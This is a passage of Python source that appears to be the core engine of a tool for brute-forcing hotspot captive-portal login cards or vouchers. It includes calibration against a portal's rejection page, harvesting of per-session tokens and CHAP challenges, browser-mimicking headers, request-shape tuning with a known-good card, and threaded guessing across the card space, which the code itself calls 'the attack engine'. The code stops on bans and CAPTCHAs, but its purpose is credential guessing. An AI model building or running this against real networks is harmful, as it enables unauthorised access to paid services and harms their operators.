"""The engine: calibrate, then try cards and report exactly what happened.

Design rules (all of them come from real failures of the old version):

1. A card is only a hit when there is positive evidence - identical-looking
   pages are never called a hit.
2. Every attempt ends in one counted verdict: ACCEPTED / REJECTED / UNKNOWN /
   BANNED / RATE_LIMITED / NET_ERROR.  The UI shows counts and reasons, so the
   user can see *why* a run went the way it did.
3. Nothing is hidden: unknown replies are saved to disk and listed for review.
4. The engine never dies silently - a traceback becomes a readable error state.
"""

from __future__ import annotations

import hashlib
import json
import os
import queue
import random
import re
import threading
import time
from collections import Counter, deque
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

from . import config, portals, verify
from .errors import classify
from .fingerprint import Fingerprinter, Judge, Verdict, find_phrase
from .httpclient import Session
from . import store


# ---------------------------------------------------------------------------
# request building - what the browser would really send
# ---------------------------------------------------------------------------
def password_value(p: dict, card: str):
    """Return the password value, or None when the field must be omitted."""
    mode = p.get("pass_mode", "empty")
    if mode == "same":
        return card
    if mode == "empty":
        return ""
    if mode == "omit":
        return None
    if mode == "fixed":
        return p.get("pass_fixed", "")
    if mode == "md5user":
        return hashlib.md5(card.encode()).hexdigest()
    if mode in ("chap", "chap_empty"):
        raw = card if mode == "chap" else ""
        chap = p.get("chap") or {}
        blob = f"{chap.get('id', '')}{raw}{chap.get('challenge', '')}"
        return hashlib.md5(blob.encode()).hexdigest()
    return card


def build_fields(p: dict, card: str) -> dict:
    fields = {}
    pw = password_value(p, card)
    if pw is not None:
        fields[p.get("pass_field") or "password"] = pw
    fields[p.get("user_field") or "username"] = card
    if p.get("send_dst") and p.get("dst_field"):
        fields[p["dst_field"]] = p.get("dst_value", "")
    if p.get("send_popup") and p.get("popup_field"):
        fields[p["popup_field"]] = "true"
    for key, value in (p.get("extra_fields") or {}).items():
        if key in fields:
            continue
        fields[key] = value
    return fields


def _without_query_fields(url: str, names) -> str:
    """Remove stale form values from a copied, already-submitted URL.

    A common way to configure a portal is to copy a URL that already contains
    `?username=OLD&password=`.  Appending the next card gives two usernames;
    many routers take the first one, so every attempt silently tests OLD.
    Preserve routing/token parameters, but replace fields we submit ourselves.
    """
    try:
        url = portals.sanitize_login_url(url)
        parts = urlsplit(url)
        remove = {str(n) for n in names if n}
        query = [(k, v) for k, v in parse_qsl(parts.query,
                                               keep_blank_values=True)
                 if k not in remove]
        return urlunsplit((parts.scheme, parts.netloc, parts.path,
                           urlencode(query, doseq=True), parts.fragment))
    except Exception:                                   # noqa: BLE001
        return url


def send_login(session: Session, p: dict, card: str, timeout=None):
    """One login attempt. Redirects are NOT followed: we must see the
    Location header, because that is the proof the portal let us out."""
    fields = build_fields(p, card)
    method = (p.get("method") or "post").lower()
    if method == "post":
        # If the operator copied a successful browser URL, do not leave its
        # old credentials in the action query while posting the new ones.
        url = _without_query_fields(
            p["login_url"], (p.get("user_field") or "username",
                             p.get("pass_field") or "password"))
        return session.request("POST", url, data=fields,
                               allow_redirects=False, timeout=timeout)
    # GET fields belong in the query string. Replace any captured values;
    # never append a second username/password/dst/token to the old URL.
    url = _without_query_fields(p["login_url"], fields.keys())
    return session.request("GET", url, params=fields,
                           allow_redirects=False, timeout=timeout)


def submitted_values(p: dict, card: str) -> list:
    values = [card, password_value(p, card) or ""]
    if p.get("send_dst"):
        values.append(p.get("dst_value", ""))
    return [v for v in values if v]


def browser_headers(p: dict, url: str = "") -> dict:
    """The headers a browser would send with this request.

    Some portals refuse anything that does not look like a browser: no
    Referer, no Origin, no form content type, or a User-Agent they do not
    like - and the operator then only ever sees "bad request".
    """
    h = dict(config.BASE_HEADERS)
    ua = (p.get("user_agent") or "").strip()
    if ua:
        h["User-Agent"] = ua
    method = (p.get("method") or "post").lower()
    if url and p.get("send_referer", True):
        # Do not echo a real card from an already-submitted copied URL into
        # Referer. The request itself replaces those values below as well.
        ref_url = _without_query_fields(
            url, (p.get("user_field") or "username",
                  p.get("pass_field") or "password"))
        h["Referer"] = ref_url
        # Browsers send Origin for a form POST, not for an ordinary GET
        # navigation.  Sending it on GET made a copied browser URL look less
        # like the browser that had just worked for the operator.
        if method == "post":
            try:
                parts = urlsplit(url)
            except Exception:                           # noqa: BLE001
                parts = None
            if parts and parts.scheme and parts.netloc:
                h["Origin"] = f"{parts.scheme}://{parts.netloc}"
    if method == "post":
        h["Content-Type"] = "application/x-www-form-urlencoded"
    return h


def new_session(timeout=None, for_attack: bool = False, headers=None) -> Session:
    """A fresh session. `for_attack` uses the tighter login timeout."""
    if timeout is None:
        timeout = (config.CONNECT_TIMEOUT,
                   config.ATTACK_READ_TIMEOUT if for_attack else config.READ_TIMEOUT)
    return Session(connect_timeout=timeout[0], read_timeout=timeout[1],
                   headers=headers)


def absorb_form(p: dict, html: str, url: str) -> dict:
    """Take what a freshly fetched login page is offering: field names, the
    form action, and the hidden values (session token, dst, popup ...).

    Without this the tool keeps posting the values captured during the scan -
    by another session, minutes ago - and portals that hand out a per-session
    token answer "bad request" for every single card.
    """
    if not (html or "").strip():
        return p
    form = portals.parse_form(html, url)
    if not form.inputs:
        # A page with no form in it - a block page, an error, a portal that
        # already let us in - must never overwrite field names we know:
        # parse_form() falls back to "username"/"password" when it finds
        # nothing, and that would silently break a working profile.
        return p
    out = dict(p)
    if form.action:
        out["login_url"] = form.action
    if form.method in ("get", "post"):
        out["method"] = form.method
    if form.user_field:
        out["user_field"] = form.user_field
    if form.pass_field:
        out["pass_field"] = form.pass_field
    if form.dst_field and not p.get("dst_field"):
        out["dst_field"] = form.dst_field
    if form.dst_value and not p.get("dst_value"):
        out["dst_value"] = form.dst_value
    if form.popup_field:
        out["popup_field"] = form.popup_field
    if form.chap:
        out["chap"] = form.chap
    extra = dict(p.get("extra_fields") or {})
    fresh = 0
    for name, value in (form.fields or {}).items():
        if name in (out.get("user_field"), out.get("pass_field")):
            continue
        # Presence matters too: several portals require an empty hidden field
        # to exist in the submitted form.  Dropping it changes the request
        # shape even though its value is empty.
        extra[name] = value
        fresh += 1
    if fresh:
        out["extra_fields"] = extra
    return out


def warm_up(session, p: dict, tries: int = 2) -> dict:
    """Ask for the login page first, the way a browser does.

    A portal hands out a session cookie and hidden fields (dst, popup, a
    per-session token, sometimes a chap challenge) *on the page*.  Posting
    without them gets "bad request" instead of a judgement - which is why a
    card that works in a browser never works from a script.  Returns the
    profile refreshed with what the page just gave us, or **None** when the
    portal did not give us a page at all: a post then would only be refused,
    and the card must stay untested instead of paying for a wish.
    """
    for attempt in range(max(1, int(tries))):
        try:
            resp = session.get(p["login_url"], allow_redirects=True)
        except Exception:                               # noqa: BLE001
            resp = None
        if resp is not None and (resp.text or "").strip():
            return absorb_form(p, resp.text, resp.url or p["login_url"])
        if attempt + 1 < max(1, int(tries)):
            time.sleep(0.15)
    return None


def _is_protective_reply(resp, login_url: str) -> tuple:
    """Return (stop, evidence) for explicit blocks, limits, or CAPTCHA pages."""
    if resp.status in (403, 429):
        return True, f"HTTP {resp.status}"
    raw = (resp.text or "").lower()
    if any(word in raw for word in ("captcha", "g-recaptcha", "hcaptcha")):
        return True, "captcha_challenge"
    word = find_phrase(raw, config.BAN_WORDS)
    if word and not portals.parse_form(resp.text or "", login_url).inputs:
        return True, word
    return False, word


# ---------------------------------------------------------------------------
# calibration
# ---------------------------------------------------------------------------
class Calibration:
    def __init__(self):
        self.steps = []
        self.ok = False
        self.fingerprint = None
        self.judge = None
        self.profile = {}
        self.internet = {}
        self.portal = None
        self.success_words = []
        self.tuned = None        # which pass_mode/dst made the known card work
        self.error = ""

    def step(self, sid: str, ok: bool, reason: str, detail=None) -> None:
        self.steps.append({"id": sid, "ok": bool(ok), "reason": reason,
                           "detail": detail or {}})

    def as_dict(self) -> dict:
        return {"ok": self.ok, "steps": self.steps,
                "internet": self.internet, "error": self.error,
                "tuned": self.tuned, "success_words": self.success_words,
                "fingerprint": None if not self.fingerprint else {
                    "exact": self.fingerprint.exact,
                    "note": self.fingerprint.note,
                    "dynamic_tokens": self.fingerprint.dynamic_count,
                    "masked_values": len(self.fingerprint.literals),
                    "learned_patterns": len(self.fingerprint.patterns),
                    "reject_status": self.fingerprint.reject_status,
                    "reject_length": self.fingerprint.reject_len,
                    "samples": self.fingerprint.samples,
                },
                "portal": self.portal.as_dict() if self.portal else None}


def bench_cards(p: dict, count: int = 3, seed: int = 0) -> list:
    """Format-valid cards used to learn the rejection page.

    They are drawn from inside the real space, so the router answers with its
    true "wrong card" page - not with a "bad format" page, which was one of
    the reasons the old baseline was wrong.
    """
    space = store.space_size(p)
    if space <= 0:
        return []
    rnd = random.Random(seed or int(time.time()))
    picks = set()
    while len(picks) < min(count, space):
        picks.add(rnd.randrange(space))
    return [store.decode_card(p, i) for i in sorted(picks)]


def calibrate(profile: dict, known_card: str = "", keyword: str = "",
              learn_known: bool = True, log=None, checks=None,
              probes: int = 3) -> Calibration:
    p = store.migrate(profile)
    cal = Calibration()
    cal.profile = p
    say = log or (lambda *a, **k: None)

    # A profile that cannot produce a single card (prefix longer than the
    # card, one-symbol charset ...) used to calibrate "successfully" with an
    # empty baseline, and every reply was then judged against nothing.
    problems = [x for x in store.validate(p)
                if x != "space_is_astronomically_big"]
    if problems:
        cal.error = problems[0]
        cal.step("profile_valid", False, problems[0], {"problems": problems})
        return cal
    if store.space_size(p) <= 0:
        cal.error = "card_space_empty"
        cal.step("profile_valid", False, "card_space_empty",
                 {"prefix": p.get("prefix", ""), "length": p.get("length", 0),
                  "charset": p.get("charset", "")[:40]})
        return cal

    session = new_session(headers=browser_headers(p, p["login_url"]))

    try:
        # --- 1. can we reach the login page at all? ---------------------
        t0 = time.time()
        try:
            resp = session.get(p["login_url"], allow_redirects=True)
        except Exception as exc:                        # noqa: BLE001
            err = classify(exc, p["login_url"])
            cal.error = err.kind
            cal.step("reach_login_page", False, f"net_{err.kind}",
                     {"text": err.text[:200]})
            return cal
        ms = (time.time() - t0) * 1000
        p["login_url"] = resp.url or p["login_url"]
        # the page we just fetched is the authority on how the request has to
        # look - a token captured by the scan belongs to another session
        p = absorb_form(p, resp.text, p["login_url"])
        # absorb_form() returns a refreshed copy: keep the calibration's
        # profile pointing at it, or the shape the tuner finds below would
        # be written into a dict nobody reads any more
        cal.profile = p

        # --- 1b. is the door already shut? --------------------------------
        # A page that still offers the login form is NOT a block page, even
        # when it mentions blocking somewhere ("... is banned" in a footnote,
        # "slow down" in a warning) - calling that a block used to stop every
        # run on networks that were perfectly reachable.  A real block page
        # replaces the form.
        page_block, page_evidence = _is_protective_reply(resp, p["login_url"])
        if page_block:
            is_challenge = page_evidence == "captcha_challenge"
            cal.error = "captcha_challenge" if is_challenge else "blocked_already"
            cal.step("reach_login_page", False,
                     "captcha_challenge" if is_challenge else "blocked_before_probes",
                     {"status": resp.status, "word": page_evidence,
                      "advice": "stop_and_contact_network_admin"})
            return cal
        page_word = find_phrase((resp.text or "").lower(), config.BAN_WORDS)
        cal.step("reach_login_page", True,
                 "http_ok_word_ignored" if page_word else "http_ok",
                 {"status": resp.status, "ms": round(ms),
                  "final_url": p["login_url"],
                  "word": page_word,
                  "note": "the page still offers the login form, so the block "
                          "word in its text was ignored" if page_word else ""})

        # --- 2. is the guest online, walled or offline? -----------------
        cal.internet = verify.probe_internet(session, checks=checks)
        state = cal.internet["state"]
        # If this machine is ALREADY online (another wifi, a cable, a VPN) then
        # "internet works" proves nothing about a card - say so instead of
        # pretending.  The engine then judges hits on redirect/status evidence.
        cal.step("internet_state", state in ("WALLED", "ONLINE"),
                 "internet_online_verification_limited" if state == "ONLINE"
                 else f"internet_{state.lower()}",
                 {**{k: v for k, v in cal.internet.items() if k != "state"},
                  "state": state})

        # --- 3. learn what a WRONG card looks like ----------------------
        probe_cards, replies = [], []
        for card in bench_cards(p, max(2, min(int(probes or 2), 4))):
            try:
                r = send_login(session, p, card)
            except Exception as exc:                    # noqa: BLE001
                err = classify(exc, p["login_url"])
                cal.step("rejection_probe", False, f"net_{err.kind}",
                         {"card_hint": card[:4] + "...", "text": err.text[:160]})
                return cal
            probe_cards.append(card)
            replies.append(r)
            protective, evidence = _is_protective_reply(r, p["login_url"])
            if protective:
                cal.error = ("captcha_challenge" if evidence == "captcha_challenge"
                             else "blocked_already")
                cal.step("rejection_baseline", False,
                         "captcha_challenge" if evidence == "captcha_challenge"
                         else "blocked_by_our_probes",
                         {"advice": "stop_and_contact_network_admin",
                          "status": r.status, "word": evidence,
                          "probes_sent": len(replies)})
                return cal
            # Rejection pages often rotate a one-use CSRF token.  A browser
            # renders the returned form and submits its new value next; do the
            # same instead of reusing the token from the first page.
            p = absorb_form(p, r.text or "", r.url or p["login_url"])
            cal.profile = p

        if not replies:
            # no probe card could be built, or every probe died: without a
            # baseline anything would look "not rejected", and a run would
            # report unverified nonsense instead of saying what happened.
            cal.error = "no_rejection_baseline"
            cal.step("rejection_baseline", False, "no_probe_reply", {})
            return cal

        # 400/405/415/422 means the endpoint rejected the *request*, not the
        # card.  With no known-good card there is no honest way to call that a
        # rejection baseline: stop before spending the user's whole space.
        shape_statuses = [r.status for r in replies
                          if r.status in (400, 405, 415, 422)]
        shape_refused = len(shape_statuses) == len(replies)
        if shape_refused and not known_card:
            cal.error = "request_shape_rejected"
            cal.step("rejection_baseline", False, "request_shape_rejected",
                     {"status": shape_statuses[:4],
                      "advice": "match_browser_session_headers_or_javascript"})
            return cal

        fp = Fingerprinter.learn(replies, login_reply=resp)
        cal.fingerprint = fp
        cal.step("rejection_baseline", True, "learned",
                 {"exact": fp.exact, "dynamic_tokens": fp.dynamic_count,
                  "samples": fp.samples,
                  "masked_values": len(fp.literals),
                  "status": fp.reject_status, "length": fp.reject_len,
                  "sample_cards": [c[:6] + "..." for c in probe_cards],
                  "note": fp.note})

        # A probe that already looks accepted is a free known-good card.
        if not known_card:
            probe_judge = Judge(fp, p["login_url"], keyword and [keyword] or [])
            for i, (card, r) in enumerate(zip(probe_cards, replies)):
                v = probe_judge.classify(r, submitted_values(p, card))
                if v.is_hit:
                    known_card = card
                    cal.step("probe_looked_accepted", True, v.reason,
                             {"card_hint": card[:4] + "..."})
                    # it must not stay inside the "wrong card" baseline, or the
                    # tool would learn the success page as a rejection
                    rest = [x for j, x in enumerate(replies) if j != i]
                    if len(rest) >= 2:
                        fp = Fingerprinter.learn(rest, login_reply=resp)
                        cal.fingerprint = fp
                        cal.step("rejection_baseline", True,
                                 "relearned_without_the_working_probe",
                                 {"exact": fp.exact, "samples": fp.samples})
                    break

        # --- 4. tune the request shape with a known-good card -----------
        if learn_known and known_card:
            wrong = known_card_problem(p, known_card)
            if wrong:
                # the card does not even fit the format we were told to guess:
                # say so before spending a single request on it
                cal.step("shape_tuned", False, "known_card_out_of_format", wrong)
            else:
                p, words, tuned, trials = _tune_with_known_card(
                    p, known_card, fp, session, checks=checks)
                # the tuner refreshes one-use hidden tokens by returning new
                # profile copies; keep Calibration pointed at the final one.
                cal.profile = p
                if words:
                    cal.success_words = words
                    p["success_words"] = words
                if tuned:
                    cal.tuned = tuned
                    cal.step("shape_tuned", True, "known_card_works",
                             {"tuned": tuned, "words": words[:6]})
                else:
                    # "could not prove it" is useless on its own: show what the
                    # router answered for every shape we tried
                    cal.step("shape_tuned", False, "known_card_not_proven",
                             {"tried": len(trials),
                              "trials": _summarise_trials(trials)})
            verify.logout(session, p["login_url"])
            if shape_refused and not cal.tuned:
                # Every learning probe and every known-card shape was rejected
                # before the credentials were judged.  Do not start a run that
                # can only repeat HTTP 400 a thousand times.
                cal.error = "request_shape_rejected"
                cal.step("rejection_baseline", False,
                         "request_shape_rejected",
                         {"status": shape_statuses[:4],
                          "advice":
                              "match_browser_session_headers_or_javascript"})
                return cal

        if keyword:
            words = list(dict.fromkeys(list(cal.success_words) + [keyword]))
            cal.success_words = words
            p["success_words"] = words

        cal.judge = Judge(fp, p["login_url"], success_words=cal.success_words,
                          success_url_contains=p.get("success_url_contains", ""))
        cal.ok = True
        return cal
    finally:
        session.close()


def _tune_with_known_card(p: dict, known_card: str, fp: Fingerprinter, session,
                          checks=None):
    """Try the sensible (password value x dst) combinations for the good card.

    Returns (profile, success_words, tuned).  A combination is accepted only
    with positive evidence: a redirect out of the portal, real internet, or a
    reply whose shape clearly differs from the rejection page.
    """
    dsts = list(dict.fromkeys([p.get("dst_value", ""),
                               "http://www.msftconnecttest.com/redirect",
                               "http://connectivitycheck.gstatic.com/generate_204",
                               ""]))
    modes = ["empty", "same", "omit", "chap", "chap_empty", "md5user"]
    if p.get("chap") is None:
        modes = [m for m in modes if not m.startswith("chap")]
    best = None
    trials = []
    # some portals take the card from the query string, some only from a
    # form body - and a page whose form is built by javascript often gets
    # scanned as "get".  Try both before saying the card does not work.
    methods = [m for m in ((p.get("method") or "post").lower(), "get", "post")
               if m in ("get", "post")]
    methods = list(dict.fromkeys(methods))

    original = ((p.get("method") or "post").lower(),
                p.get("dst_value", ""), p.get("pass_mode") or "empty")
    modes = list(dict.fromkeys([original[2]] + modes))
    candidates = [(method, dst, mode)
                  for dst in dsts for mode in modes for method in methods]
    # Spend the known card on the shape closest to what the page said first.
    # In particular, try the alternate GET/POST on the second request instead
    # of after every password/dst combination (which could fill a lockout).
    candidates.sort(key=lambda x: ((x[0] != original[0]) +
                                   (x[1] != original[1]) +
                                   (x[2] != original[2]),
                                  methods.index(x[0]), dsts.index(x[1]),
                                  modes.index(x[2])))

    for method, dst, mode in candidates[:config.KNOWN_CARD_TRIAL_LIMIT]:
        trial = dict(p)
        trial["pass_mode"] = mode
        trial["dst_value"] = dst
        trial["method"] = method
        judge = Judge(fp, p["login_url"])
        try:
            r = send_login(session, trial, known_card)
        except Exception as exc:                         # noqa: BLE001
            err = classify(exc, trial.get("login_url", ""))
            trials.append({"mode": mode, "method": method, "dst": dst,
                           "code": err.kind.upper(), "reason": err.kind,
                           "status": None, "location": "", "word": ""})
            # More request shapes cannot fix a transport failure.
            break
        verdict = judge.classify(r, submitted_values(trial, known_card))
        body = (r.text or "").lower()
        # Keep this session's fresh hidden token/cookie pair.  Some portals
        # consume a CSRF token after every failed shape.
        p = absorb_form(trial, r.text or "", r.url or trial["login_url"])
        trials.append({
            "mode": mode, "method": method, "dst": dst, "status": r.status,
            "code": verdict.code, "reason": verdict.reason,
            "location": r.location,
            "word": (verdict.data or {}).get("word")
                    or find_phrase(body, config.REJECT_WORDS)
                    or find_phrase(body, config.BAN_WORDS)})
        if verdict.code in ("BANNED", "RATE_LIMITED", "CHALLENGE") or r.status in (403, 429):
            # A real lockout is a hard stop, not a cue to keep trying shapes.
            break
        evidence = 0.0
        if r.is_redirect():
            host = (r.location.split("//")[-1].split("/")[0] or "").lower()
            if host and host != (p["login_url"].split("//")[-1]
                                 .split("/")[0].lower()):
                evidence = 0.9
        if verdict.is_hit:
            evidence = max(evidence, verdict.confidence)
        if not evidence:
            continue
        ok, info = verify.verify_online(session, checks=checks)
        if ok:
            evidence = 1.0
        words = _new_words(r.text or "", fp.reject_text)
        candidate = {"mode": mode, "method": method, "dst": dst,
                     "evidence": evidence, "verified": ok,
                     "internet": info.get("detail", ""),
                     "location": r.location[:160], "words": words}
        if best is None or candidate["evidence"] > best["evidence"]:
            best = candidate
        # A successful login puts this session "online": log out immediately
        # and do not spend the known card on lower-ranked shapes.
        verify.logout(session, p["login_url"])
        if evidence >= 0.9:
            break

    if not best:
        return p, [], None, trials

    p["pass_mode"] = best["mode"]
    p["dst_value"] = best["dst"]
    if best.get("method"):
        p["method"] = best["method"]
    tuned = {k: v for k, v in best.items() if k != "words"}
    return p, best["words"], tuned, trials


def _new_words(page: str, reference: str, limit: int = 10) -> list:
    from .fingerprint import diff_words
    return diff_words(page, reference, limit=limit)["new_words"]


# Failures of the learning phase that are usually a single hiccup: a keep-alive
# socket the router closed, a router busy for one second.  Retrying them costs
# a second; not retrying them costs the user the whole run ("it said finished
# and tried nothing").
CALIBRATION_RETRYABLE = ("stale", "reset", "read_timeout", "connect_timeout",
                         "bad_response", "unknown", "no_rejection_baseline")


def calibration_retryable(error: str) -> bool:
    return (error or "") in CALIBRATION_RETRYABLE


def block_caused_by_probes(cal) -> bool:
    """True when the router returned a block page during our test cards.

    This is recorded for diagnosis only; the engine never waits out or retries
    an explicit router/network block.
    """
    if (cal.error or "") != "blocked_already":
        return False
    return not any(s.get("reason") == "blocked_before_probes"
                   for s in cal.steps)


# ---------------------------------------------------------------------------
# diagnostics - the "why is it behaving like this" report
# ---------------------------------------------------------------------------
def diagnose(profile: dict, threads: int = 0, log=None, checks=None) -> dict:
    p = store.migrate(profile)
    out = {"ok": True, "steps": [], "latency": {}, "advice": []}
    session = new_session(headers=browser_headers(p, p["login_url"]))

    def step(sid, ok, reason, detail=None):
        out["steps"].append({"id": sid, "ok": bool(ok), "reason": reason,
                             "detail": detail or {}})

    try:
        t0 = time.time()
        try:
            r = session.get(p["login_url"], allow_redirects=True)
            blocked, evidence = _is_protective_reply(r, p["login_url"])
            if blocked:
                step("reach", False, "blocked_before_diagnostic_probes",
                     {"status": r.status, "evidence": evidence})
                out["advice"].append({"reason": "blocked_already",
                                      "fix": "stop_and_contact_network_admin"})
                out["ok"] = False
                return out
            p = absorb_form(p, r.text or "", r.url or p["login_url"])
            step("reach", True, "http_ok", {"status": r.status,
                                            "ms": round((time.time()-t0)*1000)})
        except Exception as exc:                        # noqa: BLE001
            err = classify(exc, p["login_url"])
            step("reach", False, f"net_{err.kind}", {"text": err.text[:200]})
            out["ok"] = False
            return out

        out["internet"] = verify.probe_internet(session, checks=checks)
        step("internet", out["internet"]["state"] == "WALLED",
             f"internet_{out['internet']['state'].lower()}",
             {k: v for k, v in out["internet"].items() if k != "state"})

        # Keep the complete diagnostic under a small global attempt budget.
        # If the sequential sample gets a block reply, do not start parallel
        # requests at all.
        use_threads = max(1, threads or config.DEFAULT_THREADS)
        seq_count = max(1, config.DIAGNOSTIC_SAMPLE_LIMIT // 2)
        seq = _sample(session, p, seq_count, 1)
        out["latency"]["sequential"] = seq
        step("sample_single", seq["errors"] == 0 or seq["error_rate"] < 5,
             "ok" if seq["errors"] == 0 else "errors_present", seq)

        remaining = max(0, config.DIAGNOSTIC_SAMPLE_LIMIT - seq["sent"])
        if seq.get("banned") or remaining == 0:
            par = {"sent": 0, "errors": 0, "codes": {}, "kinds": {},
                   "banned": 0, "lat": [], "error_rate": 0.0,
                   "avg_ms": 0, "p95_ms": 0, "skipped_after_block": bool(seq.get("banned"))}
        else:
            par = _sample(session, p, remaining, use_threads)
        out["latency"]["parallel"] = par
        step("sample_parallel", par["error_rate"] < 20,
             "skipped_after_block" if par.get("skipped_after_block") else
             ("ok" if par["error_rate"] < 10 else "errors_rising"), par)

        ban_seen = par.get("banned", 0) + seq.get("banned", 0)
        step("ban_check", ban_seen == 0,
             "no_ban_seen" if not ban_seen else "ban_page_seen",
             {"ban_pages": ban_seen})
        if ban_seen:
            out["advice"].append({"reason": "blocked_already",
                                  "fix": "stop_and_contact_network_admin"})
        if par["error_rate"] > 20 and seq["error_rate"] <= 5:
            rec = max(2, use_threads // 3)
            out["advice"].append({"reason": "router_pressure",
                                  "suggest_threads": rec})
        if seq["avg_ms"] > config.SLOW_DIAG_AFTER * 1000:
            out["advice"].append({"reason": "slow_router"})
        if out["internet"]["state"] == "ONLINE":
            out["advice"].append({"reason": "already_online_no_captive_portal"})
        out["ok"] = True
        return out
    finally:
        session.close()


def _sample(session: Session, p: dict, count: int, threads: int) -> dict:
    """Send wrong-but-valid cards and measure - never counts them as done.

    Every parallel worker owns one browser-like session.  Creating a bare
    session for each card loses the page cookie and CSRF token and measures
    "bad request" rather than router capacity.
    """
    cards = [c for c in bench_cards(p, max(0, min(int(count),
                                                   config.DIAGNOSTIC_SAMPLE_LIMIT)))]
    stats = {"sent": 0, "errors": 0, "codes": Counter(), "kinds": Counter(),
             "banned": 0, "lat": []}
    lock = threading.Lock()
    halt = threading.Event()

    def one(sess, live, card):
        if halt.is_set():
            return live
        if live is None:
            with lock:
                stats["sent"] += 1
                stats["errors"] += 1
                stats["kinds"]["no_session"] += 1
            return None
        t0 = time.time()
        try:
            r = send_login(sess, live, card)
        except Exception as exc:                        # noqa: BLE001
            err = classify(exc, live["login_url"])
            with lock:
                stats["sent"] += 1
                stats["errors"] += 1
                stats["kinds"][err.kind] += 1
            return live
        blocked, _evidence = _is_protective_reply(r, live["login_url"])
        fresh = absorb_form(live, r.text or "", r.url or live["login_url"])
        with lock:
            stats["sent"] += 1
            stats["lat"].append(round((time.time() - t0) * 1000))
            stats["codes"][r.status] += 1
            if blocked:
                stats["banned"] += 1
                halt.set()
        return fresh

    if threads <= 1:
        live = p
        for card in cards:
            live = one(session, live, card)
    else:
        q = queue.Queue()
        for card in cards:
            q.put(card)

        def worker():
            sess = new_session(for_attack=True,
                               headers=browser_headers(p, p["login_url"]))
            try:
                try:
                    page = sess.get(p["login_url"], allow_redirects=True)
                except Exception:                       # noqa: BLE001
                    page = None
                if page is not None:
                    blocked, _evidence = _is_protective_reply(page, p["login_url"])
                    if blocked:
                        halt.set()
                        with lock:
                            stats["banned"] += 1
                        return
                    live = absorb_form(p, page.text or "",
                                       page.url or p["login_url"])
                else:
                    live = None
                while not halt.is_set():
                    try:
                        card = q.get_nowait()
                    except queue.Empty:
                        return
                    try:
                        live = one(sess, live, card)
                    finally:
                        q.task_done()
            finally:
                sess.close()

        ws = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
        for w in ws:
            w.start()
        for w in ws:
            w.join()

    lat = sorted(stats["lat"])
    stats["error_rate"] = round(stats["errors"] / max(stats["sent"], 1) * 100, 1)
    stats["avg_ms"] = round(sum(lat) / len(lat)) if lat else 0
    stats["p95_ms"] = lat[int(len(lat) * 0.95)] if lat else 0
    stats["codes"] = {str(k): v for k, v in stats["codes"].items()}
    stats["kinds"] = dict(stats["kinds"])
    return stats


# ---------------------------------------------------------------------------
# the attack engine
# ---------------------------------------------------------------------------
_REPORT_SECRET_FIELD = re.compile(
    r"(pass|pwd|pin|user|card|voucher|token|csrf|nonce|session|chap|"
    r"challenge|cookie|auth|secret|otp)", re.I)


def safe_profile_snapshot(profile: dict) -> dict:
    """Keep debugging shape while removing reusable credentials/live tokens."""
    safe = store.migrate(profile or {})
    safe["login_url"] = portals.sanitize_login_url(
        safe.get("login_url", ""), safe.get("user_field", "username"),
        safe.get("pass_field", "password"))
    if safe.get("pass_fixed"):
        safe["pass_fixed"] = "[redacted]"
    chap = safe.get("chap")
    if isinstance(chap, dict):
        safe["chap"] = {
            "field": chap.get("field") or safe.get("pass_field", "password"),
            "id_present": bool(chap.get("id")),
            "challenge_present": bool(chap.get("challenge")),
            "values_redacted": True,
        }
    extras = safe.get("extra_fields") or {}
    safe["extra_fields"] = {
        str(name): ("[redacted]" if _REPORT_SECRET_FIELD.search(str(name))
                    and value not in (None, "") else value)
        for name, value in extras.items()
    }
    return safe


class Engine:
    """Threaded guessing with live events. One instance per web session."""

    def __init__(self, store_obj: store.Store, persist: bool = True, checks=None):
        self.store = store_obj
        self.persist = persist        # False: throw-away runs (self-test)
        self.checks = checks          # override the "are we online?" URLs
        self.lock = threading.Lock()
        self.state = "idle"
        self.events = deque(maxlen=4000)
        self.seq = 0
        self.thread = None
        self.stop_event = threading.Event()
        self.started_at = 0.0
        self.finished_at = 0.0
        self.profile = {}
        self.plan = {}
        self.counters = Counter()
        self.net_kinds = Counter()
        self.reason_counts = Counter()
        self.hits = []
        self.review = []
        self.stop_reason = ""
        self.error = ""
        self.progress = {"attempts": 0, "total": 0, "covered": 0,
                         "space": 0, "percent": 0.0}
        self.speed = 0.0
        self.latencies = deque(maxlen=500)
        self.throttle = {"delay_ms": 0, "base_ms": 0, "reason": "", "events": []}
        self.calibration = None
        self.diagnostics = None
        self.verify_enabled = True
        self.auto_stop = True
        self._internet_before = {}
        self._last_event_at = 0.0
        self._clean_streak = 0
        self._ban_count = 0
        self._recent = deque(maxlen=config.WATCH_SUSPECTS)   # last cards tried
        self._since_check = []      # cards sent since the last check
        self._watch_thread = None
        self._internet_opened = None   # set when the wall came down mid-run
        self._rate_count = 0
        self._unknown_saved = 0
        self._rejected_since_emit = 0
        # These exist even before the first run: /api/run/status is polled as
        # soon as the page opens and must never fail merely because no worker
        # pool has been built yet.
        self._pace = {"t": time.time(), "n": 0, "ok": 0, "bad": 0}
        self._pool = None
        self._unevaluated = 0
        self._retried = {}
        self._pending = []
        self._retry_processed = 0

    # -- events ----------------------------------------------------------
    def emit(self, kind: str, payload=None) -> None:
        with self.lock:
            self.seq += 1
            self.events.append({"seq": self.seq, "t": round(time.time(), 3),
                                "kind": kind, "data": payload or {}})

    def events_since(self, since: int = 0) -> list:
        with self.lock:
            return [e for e in self.events if e["seq"] > since]

    # -- public API ------------------------------------------------------
    def status(self, since: int = 0) -> dict:
        with self.lock:
            now = time.time()
            elapsed = (self.finished_at or now) - self.started_at \
                if self.started_at else 0
            processed = sum(self.counters.values())
            self.progress["attempts"] = processed   # cards really tried
            progress = dict(self.progress)
            progress.setdefault("queued", processed)
            planned = max(0, int(progress.get("total") or 0))
            progress["percent"] = round(
                min(100.0, processed / max(planned, 1) * 100), 1)
            self.speed = processed / elapsed if elapsed > 0.05 else 0.0
            # Retries count as requests, but may exceed the planned unique-card
            # count. Clamp the remainder so ETA/percent never go negative/over 100.
            left = max(0, planned - min(processed, planned))
            progress["eta_seconds"] = (round(left / self.speed)
                                       if self.speed > 0.05 else 0)
            progress["threads"] = len((self._pool or {}).get("threads", []))
            lat = sorted(self.latencies)
            return {
                "state": self.state,
                "error": self.error,
                "profile": self.profile.get("name", ""),
                "plan": self.plan,
                "counters": dict(self.counters),
                "reason_counts": dict(self.reason_counts),
                "net_kinds": dict(self.net_kinds),
                "hits": self.hits,
                "review": self.review[-40:],
